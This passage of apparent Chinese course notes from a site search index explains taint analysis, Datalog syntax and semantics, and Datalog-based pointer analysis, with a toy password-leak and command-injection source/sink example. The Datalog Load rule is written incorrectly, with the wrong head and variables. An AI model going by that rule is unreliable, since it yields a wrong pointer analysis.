<p>\u6c61\u70b9\u5206\u6790\u6280\u672f\u5c06\u8ffd\u8e2a\u6c61\u70b9\u6570\u636e\u5728\u7a0b\u5e8f\u4e2d\u7684\u6d41\u52a8\u8fc7\u7a0b\uff0c\u89c2\u5bdf\u5b83\u4eec\u662f\u5426\u6d41\u5230\u6211\u4eec\u611f\u5174\u8da3\u7684\u5730\u65b9\uff08locations of interest\uff09\uff0c\u8fd9\u4e9b\u5730\u65b9\u53c8\u79f0\u4f5c sinks\u3002\u5b9e\u9645\u573a\u666f\u4e2d\uff0csinks \u901a\u5e38\u662f\u4e00\u4e9b\u654f\u611f\u65b9\u6cd5\uff08e.g. log()\u3001print()\uff09\u3002</p> <p>\u524d\u9762\u6211\u4eec\u63d0\u5230\u8fc7\u635f\u5bb3\u673a\u5bc6\u6027\u7684\u654f\u611f\u6570\u636e\u6cc4\u9732\u5a01\u80c1\u548c\u635f\u5bb3\u5b8c\u6574\u6027\u7684\u6ce8\u5165\u5a01\u80c1\uff0c\u4e8b\u5b9e\u4e0a\uff0c\u6c61\u70b9\u5206\u6790\u80fd\u591f\u7528\u6765\u53d1\u73b0\u8fd9\u4e24\u7c7b\u5a01\u80c1\u3002\u5bf9\u4e8e\u524d\u8005\u6765\u8bf4\uff0csource \u662f\u654f\u611f\u6570\u636e\u7684\u6765\u6e90\uff0csink \u662f\u6cc4\u9732\u70b9\uff1b\u5bf9\u4e8e\u540e\u8005\u6765\u8bf4\uff0csource \u662f\u4e0d\u53d7\u4fe1\u6570\u636e\u7684\u6765\u6e90\uff0csink \u662f\u91cd\u8981\u7684\u8ba1\u7b97\u8bed\u53e5\uff08\u5982<code>eval</code>\u51fd\u6570\uff09\u3002\u4e0b\u9762\u7684\u4e24\u6bb5\u4ee3\u7801\u5206\u522b\u5c55\u793a\u4e86\u8fd9\u4e24\u4e2a\u573a\u666f\uff1a</p> <pre><code>// information leak\nx = getPassword(); // source\ny = x;\nlog(y); // sink\n\n// injection error\nx = readInput(); // source\ncmd = \"...\" + x;\nexecute(cmd); // sink\n</code></pre> <p>\u6c61\u70b9\u5206\u6790\u8981\u56de\u7b54\u7684\u95ee\u9898\u662f\uff0c\u67d0\u4e2a\u7279\u5b9a\u7684\u6c61\u70b9\u6570\u636e\u80fd\u5426\u6d41\u5230\u67d0\u4e2a sink \u5904\uff0c\u6216\u8005\u4ece\u53e6\u4e00\u4e2a\u89d2\u5ea6\u6765\u770b\uff0c\u5728\u4e00\u4e2a sink \u5904\u67d0\u4e2a\u6307\u9488\u80fd\u591f\u6307\u5411\u54ea\u4e9b\u6c61\u70b9\u6570\u636e\u3002</p> <p>Neville Grech \u548c Yannis Smaragdakis \u4e8e 2017 \u5e74\u53d1\u8868\u7684\u8bba\u6587P/Taint: Unified Points-to and Taint Analysis\u6307\u51fa\uff0c\u6c61\u70b9\u5206\u6790\u53ef\u4ee5\u57fa\u4e8e\u6307\u9488\u5206\u6790\u8fdb\u884c\uff0c\u56e0\u4e3a\u4e24\u8005\u975e\u5e38\u76f8\u4f3c\u2014\u2014\u524d\u8005\u8003\u5bdf\u7684\u662f\u6c61\u70b9\u6570\u636e\u5982\u4f55\u5728\u7a0b\u5e8f\u4e2d\u6d41\u52a8\uff0c\u540e\u8005\u8003\u5bdf\u7684\u662f\u62bd\u8c61\u5bf9\u8c61\u5982\u4f55\u5728\u7a0b\u5e8f\u4e2d\u6d41\u52a8\u3002\u6211\u4eec\u53ea\u9700\u8981\u5c06\u6c61\u70b9\u6570\u636e\u5f53\u4f5c\u4e00\u79cd\u7279\u6b8a\u7684\u201c\u4eba\u9020\u201d\u5bf9\u8c61\uff0c\u5c06 sources \u5f53\u4f5c\u6c61\u70b9\u6570\u636e\u7684 allocation sites\uff0c\u7136\u540e\u5e94\u7528\u6307\u9488\u5206\u6790\u6765\u4f20\u64ad\u6c61\u70b9\u6570\u636e\u5373\u53ef\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u4e0a\u8282\u8bfe\u5b66\u4e60\u7684\u4e0a\u4e0b\u6587\u654f\u611f\u7684\u6307\u9488\u5206\u6790\u4e5f\u53ef\u4ee5\u7528\u4e8e\u6c61\u70b9\u5206\u6790\uff0c\u4ece\u800c\u63d0\u9ad8\u5206\u6790\u7cbe\u5ea6\u3002\u4e0d\u8fc7\uff0c\u8c2d\u8001\u5e08\u540e\u9762\u5e76\u6ca1\u6709\u7ed9\u51fa\u4e0a\u4e0b\u6587\u654f\u611f\u7684\u5206\u6790\u6848\u4f8b\uff0c\u800c\u662f\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u4e0a\u4e0b\u6587\u4e0d\u654f\u611f\u5206\u6790\u6765\u8bb2\u89e3\u3002</p> <p>\u6c61\u70b9\u5206\u6790\u7684\u57df\u548c\u8bb0\u6cd5\u4e0e\u6307\u9488\u5206\u6790\u57fa\u672c\u76f8\u540c\uff0c\u9664\u4e86\u65b0\u589e\u7684\u6c61\u70b9\u6570\u636e\u90e8\u5206\uff1a</p> <ul> <li>Objects: \\(o_i,o_j \\in O\\)</li> <li>Tainted data: \\(t_i,t_j \\in T \\in O\\)</li> </ul> <p>\u5176\u4e2d\uff0c\\(t_i\\) \u8868\u793a\u6c61\u70b9\u6570\u636e\u6765\u81ea call site \\(i\\)\u3002</p> <p>\u6c61\u70b9\u5206\u6790\u7684\u8f93\u5165\u5982\u4e0b\uff1a</p> <ul> <li>Sources\uff1a\u7531 source \u65b9\u6cd5\uff08\u88ab\u8c03\u7528\u540e\u8fd4\u56de\u6c61\u70b9\u6570\u636e\u7684\u65b9\u6cd5\uff09\u7ec4\u6210\u7684\u96c6\u5408\u3002</li> <li>Sinks\uff1a\u7531\u643a\u5e26\u654f\u611f\u5b9e\u53c2\u7684 sink \u65b9\u6cd5\uff08\u6c61\u70b9\u6570\u636e\u6d41\u5411\u8fd9\u4e9b\u65b9\u6cd5\u7684\u5b9e\u53c2\uff0c\u8fdd\u80cc\u4e86\u5b89\u5168\u7b56\u7565\uff09\u7ec4\u6210\u7684\u96c6\u5408\u3002</li> </ul> <p>\u6c61\u70b9\u5206\u6790\u7684\u8f93\u51fa\u662f TaintFlows\uff0c\u5b83\u662f\u7531\u201csource \u548c sink \u65b9\u6cd5\u8c03\u7528\u6784\u6210\u7684\u5143\u7ec4\u201d\u7ec4\u6210\u7684\u96c6\u5408\uff1a\\(&lt;i,j,k&gt; \\in TaintFlows\\) \u4ee3\u8868\u6c61\u70b9\u6570\u636e\u53ef\u80fd\u4f1a\u4ece call site \\(i\\) \uff08\u53c8\u79f0\u4e3a soucce method\uff09\u6d41\u5411 call site \\(j\\) \uff08\u53c8\u88ab\u79f0\u4e3a sink method\uff09\u7684\u7b2c \\(k\\) \u4e2a\u53c2\u6570\u3002</p> <p>\u6c61\u70b9\u5206\u6790\u7684\u89c4\u5219\u4e0e\u6307\u9488\u5206\u6790\u57fa\u672c\u76f8\u540c\uff0c\u9664\u4e86\u65b0\u589e\u7684\u4e24\u6761\u5904\u7406 sources \u548c sinks \u7684\u89c4\u5219\uff1a</p> <p></p> <p>\u6c61\u70b9\u5206\u6790\u65b0\u589e\u7684\u89c4\u5219\u5747\u5e94\u7528\u4e8e Call \u6307\u4ee4\u4e0a\uff1a</p> <ul> <li>\u82e5\u8c03\u7528\u7684\u65b9\u6cd5\u5c5e\u4e8e Sources\uff0c\u5219\u521b\u5efa\u6c61\u67d3\u8282\u70b9 \\(t_l\\)\uff0c\u5e76\u8ba9\u6307\u9488 \\(r\\) \u6307\u5411\u5b83\uff0c\u5373 \\(t_i \\in pt(r)\\)</li> <li>\u82e5\u8c03\u7528\u7684\u65b9\u6cd5\u5c5e\u4e8e Sinks\uff0c\u4e14\u82e5\u5b58\u5728\u4e00\u4e2a\u53c2\u6570\uff0c\u5176\u6307\u5411\u6c61\u67d3\u8282\u70b9 \\(ti \\in pt(a_I)\\)\uff0c\u5219\u8bf4\u660e\u53d1\u73b0\u4e86\u4e00\u6761 sources \u5230 sink \u7684\u4f20\u64ad\uff0c\u5c06\u5176\u8bb0\u8f7d\u5165 TaintFlows \u4e2d\u3002</li> </ul> <p></p> <p>\u5f53\u6267\u884c\u7b2c\u4e03\u884c <code>log(s)</code> \u65f6\uff0c\u7531\u4e8e\u8be5\u65b9\u6cd5\u662f sink \u65b9\u6cd5\uff0c\u4e14\u5176\u53c2\u6570 s \u6307\u5411\u6c61\u67d3\u8282\u70b9 \\(t_3\\)\uff0c\u56e0\u6b64\u8bf4\u660e\u53d1\u73b0\u4e86\u4e00\u6761 source \u5230 sink \u7684\u4f20\u64ad\uff0c\u5c06\u5176\u8bb0\u5f55\u4e3a TaintFlow \\(&lt;3,7,0&gt;\\) \u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#datalog","title":"\u57fa\u4e8e Datalog \u7684\u9759\u6001\u5206\u6790","text":"<p>\u5728\u4e4b\u524d\u7684\u5b9e\u9a8c\u4e2d\uff0c\u6211\u4eec\u90fd\u662f\u7528 Java \u7f16\u7a0b\u5b9e\u73b0\u76f8\u5173\u7684\u5206\u6790\u3002\u5305\u62ec Java \u5728\u5185\uff0c\u5927\u591a\u6570\u7f16\u7a0b\u8bed\u8a00\u90fd\u662f\u547d\u4ee4\u5f0f\uff08imperative\uff09\u7684\uff0c\u6211\u4eec\u901a\u8fc7\u7f16\u7a0b\u6765\u544a\u8bc9\u8ba1\u7b97\u673a\u4e00\u6b65\u6b65\u9700\u8981\u505a\u4ec0\u4e48\u3002\u9664\u4e86\u547d\u4ee4\u5f0f\u8bed\u8a00\u5916\uff0c\u8fd8\u6709\u4e00\u7c7b\u58f0\u660e\u5f0f\uff08declarative\uff09\u7684\u8bed\u8a00\uff0c\u5982 SQL\u3001Prolog\u548c\u672c\u8282\u5c06\u8981\u4ecb\u7ecd\u7684Datalog\u3002\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u8ba4\u4e3a Datalog \u8bed\u8a00\u662f\u5347\u7ea7\u7248 SQL \u8bed\u8a00\uff0c\u540c\u65f6\u5728\u8bed\u6cd5\u5c42\u9762\u53c8\u662f Prolog \u8bed\u8a00\u7684\u5b50\u96c6\u3002</p> <p>\u4e0b\u9762\u4e24\u4e2a\u4ee3\u7801\u7247\u6bb5\u5b9e\u73b0\u4e86\u76f8\u540c\u7684\u529f\u80fd\uff0c\u4f46\u5206\u522b\u91c7\u7528\u4e86\u547d\u4ee4\u5f0f\u8bed\u8a00\u548c\u58f0\u660e\u5f0f\u8bed\u8a00\u3002</p> <p>\u9996\u5148\u662f\u547d\u4ee4\u5f0f\uff1a</p> <pre><code>Set&lt;Person&gt; selectAdults(Set&lt;Person&gt; persons) {\n    Set&lt;Person&gt; result = new HashSet&lt;&gt;();\n    for (Person person : persons)\n        if (person.getAge() &gt;= 18)\n            result.add(person);\n    return result;\n}\n</code></pre> <p>\u63a5\u7740\u662f\u58f0\u660e\u5f0f\uff1a</p> <pre><code>SELECT * FROM Persons WHERE Age &gt;= 18;\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u58f0\u660e\u5f0f\u8bed\u8a00\u7684\u4ee3\u7801\u66f4\u4e3a\u7b80\u6d01\uff0c\u5ffd\u7565\u4e86\u5f88\u591a\u5b9e\u73b0\u76f8\u5173\u3001\u7b97\u6cd5\u65e0\u5173\u7684\u7ec6\u8282\u3002\u4e8b\u5b9e\u4e0a\uff0c\u4f7f\u7528 Datalog \u8fd9\u79cd\u58f0\u660e\u5f0f\u8bed\u8a00\u6765\u5b9e\u73b0\u7a0b\u5e8f\u5206\u6790\u7b97\u6cd5\u4e5f\u8981\u6bd4\u4f7f\u7528\u547d\u4ee4\u5f0f\u8bed\u8a00\u7b80\u5355\uff0c\u6700\u7ec8\u4ea7\u7269\u4e5f\u66f4\u7b80\u6d01\u3001\u53ef\u8bfb\u3002</p> <p>Datalog\uff0c\u62c6\u5f00\u5c31\u662f Data+Logic\uff0c\u5b83\u6709\u56db\u4e2a\u7279\u70b9\uff1a\u65e0\u526f\u4f5c\u7528\uff0c\u65e0\u63a7\u5236\u6d41\uff0c\u65e0\u51fd\u6570\uff0c\u975e\u56fe\u7075\u5b8c\u5907\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#predicates-data","title":"Predicates (Data)","text":"<p>\u5728 Datalog \u4e2d\uff0cpredicate\uff08\u8c13\u8bcd\uff09 \u662f\u4e00\u4e2a\u58f0\u660e\u96c6\u5408\uff0c\u53ef\u4ee5\u7c7b\u6bd4\u4e3a\u6570\u636e\u8868\u3002</p> <p>\u4e00\u4e2a fact \u5219\u662f\u9488\u5bf9\u67d0\u4e2a\u7279\u5b9a tuple \u662f\u5426\u5c5e\u4e8e\u4e00\u4e2a\u5173\u7cfb\u7684\u65ad\u8a00\u2014\u2014\u9488\u5bf9\u7ed9\u5b9a\u7684\u503c\u7684\u7ec4\u5408\uff0c\u67d0 predicate \u4e3a\u771f\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5047\u8bbe\u6709\u4e00\u4e2a predicate\uff08table\uff09\u662f Age\uff0c\u5305\u542b person \u548c age \u4e24\u4e2a column\uff0c\u90a3\u4e48<code>(\"Xiaoming\", 18)</code>\u4e3a\u771f\uff08fact\uff09\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u5143\u7ec4\u5b58\u5728\u4e8e Age predicate \u4e2d\uff1b\u800c <code>(\"Alan\", 18)</code> \u4e0d\u662f\u771f\uff08fact\uff09\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#atoms","title":"Atoms","text":"<p>Atoms \u662f Datalog \u4e2d\u7684\u57fa\u672c\u5143\u7d20\uff0c\u7528\u6765\u4ee5\u4e0b\u9762\u8fd9\u79cd\u5f62\u5f0f\u8868\u793a predicate\uff1a</p> <pre><code>P(X1, X2, ..., Xn)\n</code></pre> <p>\u5176\u4e2d P \u662f predicate \u540d\uff0c\u540e\u9762\u8ddf\u7684 X1 \uff5e Xn \u662f arguments\uff08terms\uff09\u3002Terms \u53ef\u4ee5\u662f Variables\uff08\u53d8\u91cf\uff09\u6216 Constants\uff08\u5e38\u91cf\uff09\u3002</p> <p>\u4f8b\u5982\uff0c<code>Age(\"Xiaoming\", 18)</code>\u5c31\u662f\u4e00\u4e2a atom\u3002<code>P(X1, X2, ..., Xn)</code>\u53c8\u79f0\u4f5c relational atoms\uff0c\u5f53\u4e14\u4ec5\u5f53\u8c13\u8bcd P \u5305\u542b X1 \u5230 Xn \u63cf\u8ff0\u7684\u5143\u7ec4\u65f6\uff0c\u5b83\u624d\u4e3a\u771f\u3002\u9664\u4e86 relational atoms \u5916\uff0cDatalog \u8fd8\u6709 arithmetic atoms\uff0c\u5982<code>age &gt;= 18</code>\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#datalog-rules-logic","title":"Datalog Rules (Logic)","text":"<p>\u89c4\u5219\u662f Datalog \u4e2d\u8868\u793a\u903b\u8f91\u63a8\u7406\u7684\u5f62\u5f0f\uff0c\u7528\u4e8e\u8bf4\u660e facts \u7684\u63a8\u5bfc\u8fc7\u7a0b\u3002Datalog \u4e2d\u57fa\u672c\u7684\u89c4\u5219\u5f62\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>H &lt;- B1, B2, ..., Bn.\n</code></pre> <p>H \u8868\u793a head\uff08consequent\uff09\uff0c\u662f\u4e00\u4e2a atom\uff1bB1 \uff5e Bn \u8868\u793a body\uff08antecedent\uff09\uff0cBi \u4e5f\u662f atom\uff08\u53ef\u4ee5\u662f\u5426\u5b9a\u7684\uff09\uff0c\u6bcf\u4e2a Bi \u90fd\u662f\u4e00\u4e2a subgoal\u3002</p> <p></p> <p>\u4e0a\u8ff0\u89c4\u5219\u7684\u610f\u601d\u662f\uff1a\u5f53 body \u4e3a\u771f\u65f6\uff0chead \u4e3a\u771f\u3002</p> <p>\uff081\uff09\u903b\u8f91\u4e0e</p> <p>\u9017\u53f7<code>,</code>\u8868\u793a \u903b\u8f91\u4e0e\uff0c\u5373\uff0cB1 \uff5e Bn \u6240\u6709 subgoals \u5747\u4e3a\u771f\u65f6\uff0cbody \u624d\u4e3a\u771f\uff0c\u7ee7\u800c head \u624d\u4e3a\u771f\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u5982\u4e0b\u89c4\u5219\u63a8\u5bfc\u51fa\u6210\u5e74\u4eba\uff1a</p> <pre><code>Adult(person) &lt;- Age(person, age), age &gt;= 18\n</code></pre> <p>\u4e0a\u8ff0\u89c4\u5219\u7684\u89e3\u6790\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ul> <li>\u8003\u8651\u6240\u6709 subgoals \u4e2d\u7684\u53d8\u91cf\u7684\u503c\u7684\u6240\u6709\u53ef\u80fd\u7ec4\u5408\u3002</li> <li>\u5982\u679c\u67d0\u4e2a\u7ec4\u5408\u80fd\u591f\u8ba9\u6240\u6709 subgoals \u4e3a\u771f\uff0c\u5219 head atom \u4e5f\u4e3a\u771f\u3002</li> <li>head \u8c13\u8bcd\u5305\u542b\u6240\u6709 true atoms\u3002</li> </ul> <p>\uff082\uff09\u903b\u8f91\u6216</p> <p>\u5728 Datalog \u4e2d\u6709\u4e24\u79cd\u65b9\u5f0f\u8868\u793a \u903b\u8f91\u6216\uff1a</p> <ul> <li>\u4e00\u79cd\u65b9\u5f0f\u662f\u7528\u5206\u53f7<code>;</code>\u8fde\u63a5</li> <li>\u53e6\u4e00\u79cd\u65b9\u5f0f\u662f\u5199\u591a\u4e2a head \u76f8\u540c\u7684\u89c4\u5219\u3002</li> </ul> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cDatalog \u4e2d\u4e5f\u6709\u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7\uff0c\u201c\u903b\u8f91\u6216\u201d\u4f4e\u4e8e\u201c\u903b\u8f91\u4e0e\u201d\uff0c\u56e0\u6b64\u62ec\u53f7\u6709\u65f6\u5fc5\u4e0d\u53ef\u5c11\u3002</p> <p>\uff083\uff09\u903b\u8f91\u5426</p> <p>\u611f\u53f9\u53f7<code>!</code>\u5219\u8868\u793a\u5bf9\u67d0 atom \u7684\u5426\u5b9a\uff0c\u5982<code>!B(...)</code>\u3002</p> <p></p> <p>\u4e0a\u56fe\u662f\u4e00\u4e2a\u89e3\u6790\u89c4\u5219\u7684\u4f8b\u5b50\u3002</p> <p>\u90a3\u4e48\uff0c\u521d\u59cb\u6570\u636e\uff0c\u6216\u8005\u8bf4\u90a3\u4e9b facts\uff0c\u6765\u81ea\u54ea\u5462\uff1f</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#edb-idb","title":"EDB \u548c IDB \u8c13\u8bcd","text":"<p>Datalog \u4e2d\u7684\u8c13\u8bcd\u5206\u4e3a\u4e24\u90e8\u5206\uff1aEDB\uff08extensional database\uff09\u548c IDB\uff08intensional database\uff09\u3002\u524d\u8005\u662f\u9884\u5148\u5b9a\u4e49\u7684\uff0c\u4f5c\u4e3a\u7a0b\u5e8f\u8f93\u5165\uff0c\u4e14\u4e0d\u53ef\u53d8\uff1b\u540e\u8005\u662f\u7531\u89c4\u5219\u521b\u5efa\u7684\uff0c\u5173\u7cfb\u7531\u89c4\u5219\u63a8\u7406\u800c\u6765\uff0c\u53ef\u4ee5\u770b\u505a\u7a0b\u5e8f\u7684\u8f93\u51fa\u3002</p> <p>\u5bf9\u4e8e\u4e00\u6761\u89c4\u5219<code>H &lt;- B1, B2, ..., Bn.</code>\u6765\u8bf4\uff0cH \u53ea\u80fd\u662f IDB\uff0cBi \u5219\u53ef\u4ee5\u662f EDB \u6216 IDB\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_13","title":"\u9012\u5f52","text":"<p>Datalog \u652f\u6301\u9012\u5f52\u7684\u89c4\u5219\uff0c\u5141\u8bb8 IDB \u8c13\u8bcd\u7684\u81ea\u63a8\u5bfc\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u5728\u8ba1\u7b97\u56fe\u4e0a\u7684\u53ef\u8fbe\u6027\u4fe1\u606f\uff08\u4f20\u9012\u95ed\u5305\uff09\u65f6\uff0c\u5c31\u9700\u8981\u9012\u5f52\u89c4\u5219\uff1a</p> <pre><code>Reach(from, to) &lt;- Edge(from, to).\nReach(from, to) &lt;- Reach(from, node), Edge(node, to).\n</code></pre> <p>\u6b63\u662f\u9012\u5f52\u8d4b\u4e88\u4e86 Datalog \u8d85\u51fa SQL \u7684\u5f3a\u5927\u80fd\u529b\u3002\u4e5f\u56e0\u6b64\uff0c\u6211\u4eec\u80fd\u5c06\u5176\u7528\u4e8e\u590d\u6742\u7a0b\u5e8f\u5206\u6790\u4e2d\u3002</p> <p>\u53e6\u5916\u6ce8\u610f\uff0c\u4e0b\u9762\u8fd9\u6837\u7684\u89c4\u5219\u662f\u4e0d\u53ef\u884c\u7684\uff1a</p> <pre><code>A(x) &lt;- B(x), !A(x)\n</code></pre> <p>\u5b83\u662f\u81ea\u76f8\u77db\u76fe\u800c\u65e0\u610f\u4e49\u7684\u3002\u4f8b\u5982\uff0c\u5728<code>B(1)</code>\u4e3a\u771f\u65f6\uff0c\u5982\u679c<code>A(1)</code>\u4e3a\u771f\uff0c\u5219\u5f97\u51fa<code>A(1)</code>\u4e3a\u5047\uff0c\u53cd\u8fc7\u6765\u7c7b\u4f3c\uff0c\u90fd\u662f\u77db\u76fe\u7684\u3002\u56e0\u6b64\uff0c\u5728 Datalog \u4e2d\uff0c\u5bf9\u540c\u4e00 atom \u7684\u9012\u5f52\u548c\u5426\u5b9a\u5fc5\u987b\u5206\u5f00\uff0c\u5426\u5219\u8be5\u89c4\u5219\u53ef\u80fd\u65e0\u6cd5\u6536\u655b\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#datalog_1","title":"Datalog \u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b","text":"<p>Datalog \u5f15\u64ce\u7684\u8f93\u5165\u662f EDB \u548c rules\uff0c\u8f93\u51fa\u662f IDB\u3002\u5f15\u64ce\u5c06\u6839\u636e\u8f93\u5165\u6765\u63a8\u7406 facts\uff0c\u76f4\u5230\u6ca1\u6709\u65b0 facts \u4ea7\u751f\u3002\u5e38\u89c1\u7684\u5f15\u64ce\u6709 LogicBlox\u3001Souffl\u00e9\u3001XSB\u3001Datomic \u548c Flora-2 \u7b49\u3002</p> <p>\u6211\u4eec\u5728\u4e4b\u524d\u7684\u5b66\u4e60\u4e2d\u63d0\u5230\u8fc7\u5355\u8c03\u6027\u3002\u4e8b\u5b9e\u4e0a\uff0cDatalog \u662f\u5355\u8c03\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5df2\u7ecf\u4ea7\u751f\u7684 facts \u4e0d\u4f1a\u88ab\u5220\u9664\u3002</p> <p>\u6211\u4eec\u8bf4 Datalog \u7a0b\u5e8f\u662f\u53ef\u7ec8\u6b62\u7684\uff0c\u56e0\u4e3a\uff1aDatalog \u662f\u5355\u8c03\u7684\uff0c\u4e14\u5728\u89c4\u5219\u5b89\u5168\u7684\u524d\u63d0\u4e0b\uff0cIDB \u8c13\u8bcd\u7684\u53ef\u80fd\u503c\u662f\u6709\u9650\u7684\u3002</p> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_14","title":"\u4e0d\u5b89\u5168\u7684\u8bed\u53e5","text":"<p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e0b\u8ff0\u89c4\u5219\u662f\u4e0d\u5b89\u5168\u7684\uff08\u56e0\u6b64\u4e5f\u4e0d\u88ab Datalog \u5141\u8bb8\uff09\uff1a</p> <pre><code>A(x) &lt;- B(y), x &gt; y.\nA(x) &lt;- B(y), !C(x, y).\nA(x) &lt;- B(x), !A(x).\n</code></pre> <p>\u4e3a\u4ec0\u4e48\u5b83\u4eec\u662f\u4e0d\u5b89\u5168\u7684\uff1f\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u89c4\u5219\u90fd\u6ca1\u6709\u5bf9 x \u8fdb\u884c\u6709\u6548\u9650\u5236\uff0c\u610f\u5473\u7740\u53ef\u4ee5\u6ee1\u8db3\u89c4\u5219\u7684 x \u662f\u65e0\u9650\u7684\uff0c\u8fd9\u5c06\u5bfc\u81f4 A \u662f\u4e00\u4e2a\u65e0\u7a77\u5c3d\u7684\u5173\u7cfb\u3002\u7b2c\u4e8c\u4e2a\u89c4\u5219\u53ef\u80fd\u5177\u6709\u4e00\u4e9b\u8ff7\u60d1\u6027\uff0c\u4f46\u662f\u5b83\u786e\u5b9e\u4e5f\u662f\u4e0d\u5b89\u5168\u7684\u2014\u2014\u4e5f\u8bb8<code>C(x, y)</code>\u5bf9 x \u8fdb\u884c\u4e86\u9650\u5236\uff0c\u4f46\u662f\u5bf9\u5b83\u53d6\u5426\u5b9a\u5219\u5bfc\u81f4 x \u65e0\u9650\u5236\u3002\u53ea\u6709\u5f53\u89c4\u5219\u5185\u7684\u6bcf\u4e2a\u53d8\u91cf\u81f3\u5c11\u51fa\u73b0\u5728\u4e00\u4e2a\u975e\u5426\u5b9a\u7684\u5173\u7cfb atom \u4e2d\u65f6\uff0c\u8fd9\u4e2a\u89c4\u5219\u624d\u662f\u5b89\u5168\u7684\u3002</p> <p>\u7b2c\u4e09\u4e2a\u89c4\u5219\u5219\u4f1a\u9020\u6210\u81ea\u53cd\u9012\u5f52\uff0c\u4e14\u65e0\u610f\u4e49\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#datalog_2","title":"\u57fa\u4e8e Datalog \u7684\u6307\u9488\u5206\u6790","text":"<p>\u4e0b\u9762\uff0c\u6211\u4eec\u6765\u7814\u7a76\u4e00\u4e0b\u5982\u4f55\u57fa\u4e8e Datalog \u5b9e\u73b0\uff08\u4e0a\u4e0b\u6587\u4e0d\u654f\u611f\u7684\uff09\u6307\u9488\u5206\u6790\u3002\u9996\u5148\u660e\u786e\u4e00\u4e0b\u8f93\u5165\u8f93\u51fa\uff1a</p> <ul> <li>\u89c4\u5219\uff1a\u6307\u9488\u5206\u6790\u89c4\u5219\uff0c\u5305\u62ec New\u3001Assign\u3001Store\u3001Load\uff08\u5148\u4e0d\u8003\u8651 Call \u89c4\u5219\uff09\u3002</li> <li>EDB\uff1a\u4ece\u7a0b\u5e8f\u4e2d\u63d0\u53d6\u7684\u6307\u9488\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u5305\u62ec\uff1a</li> <li><code>New(x:V, o:O)</code></li> <li><code>Assign(x:V, y:V)</code></li> <li><code>Store(x:V, f:F, y:V)</code></li> <li><code>Load(y:V, x:V, f:F)</code></li> <li>IDB\uff1a\u6307\u9488\u5206\u6790\u7ed3\u679c\uff0c\u5305\u62ec\uff1a</li> <li><code>VarPointsTo(v : V, o : O)</code></li> <li><code>FieldPointsTo(oi : O, f : F, oj : O)</code></li> </ul> <p>\u6211\u4eec\u7ed3\u5408\u4e00\u4e2a\u6848\u4f8b\u6765\u5206\u6790\uff1a</p> <pre><code>1 b = new C();\n2 a = b;\n3 c = new C();\n4 c.f = a;\n5 d = c;\n6 c.f = d;\n7 e = d.f;\n</code></pre> <p>EDB \u8f93\u5165\u5982\u4e0b\uff1a</p> <p></p> <p>\u4e0b\u9762\u662f\u4e4b\u524d\u6211\u4eec\u603b\u7ed3\u7684\u6307\u9488\u5206\u6790\u89c4\u5219\uff1a</p> <p></p> <p>\u8fd9\u4e9b\u89c4\u5219\u5bf9\u5e94\u7684 Datalog \u89c4\u5219\u5982\u4e0b\uff1a</p> <pre><code>VarPointsTo(x, o) &lt;- New(x, o).\nVarPointsTo(x, o) &lt;- Assign(x, y), VarPointsTo(y, o).\nFieldPointsTo(oi, f, oj) &lt;- Store(x, f, y), VarPointsTo(x, oi), VarPointsTo(y, oj).\nVarPointsTo(x, o) &lt;- Load (y, x, f), VarPointsTo(x, oi), FieldPointsTo(oi, f, oj).\n</code></pre> <p>Datalog 